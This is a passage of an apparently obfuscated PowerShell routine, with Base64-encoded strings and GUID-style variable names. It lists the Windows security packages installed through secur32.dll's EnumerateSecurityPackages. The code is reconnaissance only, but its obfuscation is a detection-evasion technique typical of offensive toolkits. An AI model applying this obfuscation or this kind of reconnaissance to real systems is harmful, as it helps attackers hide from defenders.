    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMARQBQAFQAXwBXAEkATgAzADIAXwBOAEEATQBFAA=='))), 0x200)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAFIARQBBAE0A'))), 0x400)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAEcATwBUAEkAQQBCAEwARQA='))), 0x800)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBTAFMAXwBDAE8ATQBQAEEAVABJAEIATABFAA=='))), 0x1000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEcATwBOAA=='))), 0x2000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAF8AQgBVAEYARgBFAFIAUwA='))), 0x4000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBSAEEARwBNAEUATgBUAA=='))), 0x8000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBVAFQAVQBBAEwAXwBBAFUAVABIAA=='))), 0x10000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEwARQBHAEEAVABJAE8ATgA='))), 0x20000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAEEARABPAE4ATABZAF8AVwBJAFQASABfAEMASABFAEMASwBTAFUATQA='))), 0x40000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAVABSAEkAQwBUAEUARABfAFQATwBLAEUATgBTAA=='))), 0x80000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAEcATwBfAEUAWABUAEUATgBEAEUAUgA='))), 0x100000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAEcATwBUAEkAQQBCAEwARQAyAA=='))), 0x200000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAFAAQwBPAE4AVABBAEkATgBFAFIAXwBQAEEAUwBTAFQASABSAE8AVQBHAEgA'))), 0x400000)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAFAAQwBPAE4AVABBAEkATgBFAFIAXwBDAEgARQBDAEsAUwA='))), 0x800000)
    ${845747684be04a1c8f756bf8fe82d800} = ${d09bb55ff972413ead29f35f8a7f48b0}.CreateType()
    ${45b97198ae354124831731ef24c92007} = ${ac678682e4f149bfafb1b16e8d88c398}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAuAFMAZQBjAFAAawBnAEkAbgBmAG8A'))), ${2a6b61d5404b4a36899cdae620046f62}, [Object], [Reflection.Emit.PackingSize]::Size8)
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBDAGEAcABhAGIAaQBsAGkAdABpAGUAcwA='))), ${845747684be04a1c8f756bf8fe82d800}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBWAGUAcgBzAGkAbwBuAA=='))), [Int16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBSAFAAQwBJAEQA'))), [Int16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBiAE0AYQB4AFQAbwBrAGUAbgA='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    $null = ${45b97198ae354124831731ef24c92007}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
    ${51c48e6f503547d5a1af31028b97d2a5} = ${45b97198ae354124831731ef24c92007}.CreateType()
    ${45b97198ae354124831731ef24c92007} = ${ac678682e4f149bfafb1b16e8d88c398}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAuAFMAZQBjAHUAcgAzADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEMAbABhAHMAcwA='))))
    ${3a0d90aa783842659ba2918c88428ef3} = ${45b97198ae354124831731ef24c92007}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUAUwBlAGMAdQByAGkAdAB5AFAAYQBjAGsAYQBnAGUAcwA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGMAdQByADMAMgAuAGQAbABsAA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Reflection.CallingConventions]::Standard,
        [Int32],
        [Type[]] @([Int32].MakeByRefType(),
            [IntPtr].MakeByRefType()),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    ${036a3cc75ce04b6e8c8f0f3f43bb1521} = ${45b97198ae354124831731ef24c92007}.CreateType()
    ${2136db02e44f4de8a5c7f94b1c3e1b30} = 0
    ${8d0c3967fbd946f4922a42c273f3fcb8} = [IntPtr]::Zero
    ${8d8d49797b5b494095bad3098d94ec73} = ${036a3cc75ce04b6e8c8f0f3f43bb1521}::EnumerateSecurityPackages([Ref] ${2136db02e44f4de8a5c7f94b1c3e1b30}, [Ref] ${8d0c3967fbd946f4922a42c273f3fcb8})
    if (${8d8d49797b5b494095bad3098d94ec73} -ne 0)
    {
        throw "Unable to enumerate seucrity packages. Error (0x$(${8d8d49797b5b494095bad3098d94ec73}.ToString('X8')))"
    }
    if (${2136db02e44f4de8a5c7f94b1c3e1b30} -eq 0)
    {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIABpAG4AcwB0AGEAbABsAGUAZAAgAHMAZQBjAHUAcgBpAHQAeQAgAHAAYQBjAGsAYQBnAGUAcwAuAA==')))
        return
    }
    ${4d58aec7546049d28371ff982f0e2c58} = ${8d0c3967fbd946f4922a42c273f3fcb8}
    foreach ($i in 1..${2136db02e44f4de8a5c7f94b1c3e1b30})
    {
        ${9e676a9cf4a647668f2fc350c23da73c} = [Runtime.InteropServices.Marshal]::PtrToStructure(${4d58aec7546049d28371ff982f0e2c58}, [Type] ${51c48e6f503547d5a1af31028b97d2a5})
        ${4d58aec7546049d28371ff982f0e2c58} = [IntPtr] (${4d58aec7546049d28371ff982f0e2c58}.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] ${51c48e6f503547d5a1af31028b97d2a5}))
        ${fbef978007bd41f7b91c557d1c93d266} = $null
        if (${9e676a9cf4a647668f2fc350c23da73c}.Name -ne [IntPtr]::Zero)
        {
            ${fbef978007bd41f7b91c557d1c93d266} = [Runtime.InteropServices.Marshal]::PtrToStringAnsi(${9e676a9cf4a647668f2fc350c23da73c}.Name)
        }
        ${11587f86c7d64252820518c462df8ed0} = $null
        if (${9e676a9cf4a647668f2fc350c23da73c}.Comment -ne [IntPtr]::Zero)
        {
            ${11587f86c7d64252820518c462df8ed0} = [Runtime.InteropServices.Marshal]::PtrToStringAnsi(${9e676a9cf4a647668f2fc350c23da73c}.Comment)
        }
        ${c0c8f88f6219441b8f0353b4b6743577} = @{
            Name = ${fbef978007bd41f7b91c557d1c93d266}
            Comment = ${11587f86c7d64252820518c462df8ed0}
            Capabilities = ${9e676a9cf4a647668f2fc350c23da73c}.fCapabilities
            MaxTokenSize = ${9e676a9cf4a647668f2fc350c23da73c}.cbMaxToken
        }
        ${ab7e17eb066b4e0cb4ce12583adc5c8b} = New-Object PSObject -Property ${c0c8f88f6219441b8f0353b4b6743577}
        ${ab7e17eb066b4e0cb4ce12583adc5c8b}.PSObject.TypeNames[0] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEMAVQBSADMAMgAuAFMARQBDAFAASwBHAEkATgBGAE8A')))
        ${ab7e17eb066b4e0cb4ce12583adc5c8b}
    }
}